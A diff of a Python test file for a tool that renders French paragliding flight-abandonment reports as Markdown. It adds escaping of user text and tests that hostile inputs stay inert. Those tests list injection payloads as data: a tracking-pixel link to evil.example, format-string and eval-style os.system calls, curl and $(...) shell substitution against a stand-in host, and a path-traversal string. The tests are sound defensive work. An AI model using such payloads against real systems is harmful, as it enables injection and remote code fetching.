@@ -217,6 +217,9 @@ class TestV2Format:
         assert entry.narrative == "" and entry.trigger_short == "" and entry.lesson == ""
 
     def test_byte_exact_v2_output(self):
+        # User-typed values are markdown-escaped in the body (never in the
+        # front matter, which is YAML-escaped and rendered as plain text).
+        esc = sync.escape_markdown
         entry = sync.parse_row(make_raw_v2())
         expected = f"""---
 title: "Renoncement du 30/07/2026"
@@ -224,30 +227,30 @@ date: 2026-07-31T13:29:39+02:00
 summary: "Débutant (en progression) · Décision collective — « Le vent est passé travers plein au déco »"
 draft: false
 ---
-**Expérience :** Débutant (en progression) | **Décision :** Décision collective
+**Expérience :** {esc("Débutant (en progression)")} | **Décision :** Décision collective
 
 ### Pourquoi voler ?
 ma première transition chartreuse belledonne
 
 ### Le récit
-Le plan a changé deux fois : triangle ambitieux, puis aller-retour, puis plouf.
-La vague de pression arrivait plus tôt que prévu.
+{esc("Le plan a changé deux fois : triangle ambitieux, puis aller-retour, puis plouf.")}
+{esc("La vague de pression arrivait plus tôt que prévu.")}
 
 ### Le déclencheur
 Le vent est passé travers plein au déco
 
 ### Qu'en retires-tu ?
-Décider avant de monter, pas sur le déco.
+{esc("Décider avant de monter, pas sur le déco.")}
 
 ### Signaux Faibles
-* **Facteurs humains :** {REAL_HUMAN_FACTORS}
-* **Facteurs sociaux :** Bruit informationnel (Canal WhatsApp qui s'enflamme, fausses bonnes infos)
-* **Facteurs aérologiques & environnement :** {REAL_AERO_FACTORS}
+* **Facteurs humains :** {esc(REAL_HUMAN_FACTORS)}
+* **Facteurs sociaux :** {esc("Bruit informationnel (Canal WhatsApp qui s'enflamme, fausses bonnes infos)")}
+* **Facteurs aérologiques & environnement :** {", ".join(esc(i) for i in sync.split_checkboxes(REAL_AERO_FACTORS))}
 
 ### Analyse
-* **Sentiment :** Satisfait(e) d'avoir fait le bon choix
-* **Facteur le plus difficile à ignorer :** L'investissement logistique et temps déjà consenti
-* **Décision possible plus tôt ?** Non, la décision devait se prendre au déco.
+* **Sentiment :** {esc("Satisfait(e) d'avoir fait le bon choix")}
+* **Facteur le plus difficile à ignorer :** {esc("L'investissement logistique et temps déjà consenti")}
+* **Décision possible plus tôt ?** {esc("Non, la décision devait se prendre au déco.")}
 * **Stress :** 1/5 | **Confiance renforcée :** 4/5
 """
         assert sync.render_markdown(entry) == expected
@@ -275,6 +278,56 @@ Décider avant de monter, pas sur le déco.
     def test_narrative_newlines_preserved(self):
         entry = sync.parse_row(make_raw_v2())
         assert "\n" in entry.narrative
+
+    def test_escape_markdown_neutralizes_syntax(self):
+        assert sync.escape_markdown("**gras**") == r"\*\*gras\*\*"
+        assert sync.escape_markdown("# titre") == r"\# titre"
+        assert sync.escape_markdown("![pixel](http://evil/p.png)") == r"\!\[pixel\]\(http\://evil/p\.png\)"
+        assert sync.escape_markdown("\\") == "\\\\"
+        assert sync.escape_markdown("été à 2000 m, rien à signaler") == "été à 2000 m, rien à signaler"
+
+    def test_tracking_pixel_markdown_is_inert(self):
+        raw = make_raw_v2(narrative="regarde ![pixel](https://evil.example/p.png) là")
+        markdown = sync.render_markdown(sync.parse_row(raw))
+        assert "![pixel]" not in markdown
+        assert r"\!\[pixel\]" in markdown
+
+    def test_heading_and_emphasis_are_inert(self):
+        raw = make_raw_v2(narrative="# faux titre\n**pas gras**")
+        markdown = sync.render_markdown(sync.parse_row(raw))
+        assert "\n# faux titre" not in markdown
+        assert r"\# faux titre" in markdown
+        assert r"\*\*pas gras\*\*" in markdown
+
+    def test_summary_is_not_escaped(self):
+        # The summary is YAML-escaped plain text, never markdown: no backslashes.
+        raw = make_raw_v2(trigger_short="vent (fort) à l'atterro")
+        markdown = sync.render_markdown(sync.parse_row(raw))
+        assert "« vent (fort) à l'atterro »" in markdown.split("---", 2)[1]
+
+    def test_hostile_payloads_stay_inert_data(self, tmp_path):
+        # Classic injection payloads must round-trip as literal text: no
+        # exception, file written under the hash name, content escaped.
+        payloads = [
+            "{0.__class__.__mro__}{settings.SECRET}",     # format-string attack
+            "__import__('os').system('id')",              # eval-style payload
+            "'; import os; os.system('curl evil') #",
+            "$(curl https://evil.example) `id`",          # shell metacharacters
+            "../../.github/workflows/evil.yml",           # path traversal attempt
+            "ligne\x00nulle et \x1b[31mANSI\x1b[0m",      # control characters
+        ]
+        raw = make_raw_v2(narrative="\n".join(payloads))
+        entry = sync.parse_row(raw)
+        markdown = sync.render_markdown(entry)
+        written, removed = sync.sync_content_dir(
+            {sync.compute_rex_id(entry.timestamp_raw): markdown}, tmp_path
+        )
+        assert (written, removed) == (1, 0)
+        files = list(tmp_path.glob("*.md"))
+        assert len(files) == 1 and len(files[0].stem) == 10  # hash-named only
+        content = files[0].read_text(encoding="utf-8")
+        assert r"\_\_import\_\_" in content                  # escaped, not executable
+        assert "curl" in content                             # present as plain text
 
     def test_mixed_rows_both_formats(self, tmp_path):
         rows = [make_raw(), make_raw_v2(timestamp="01/08/2026 09:00:00")]
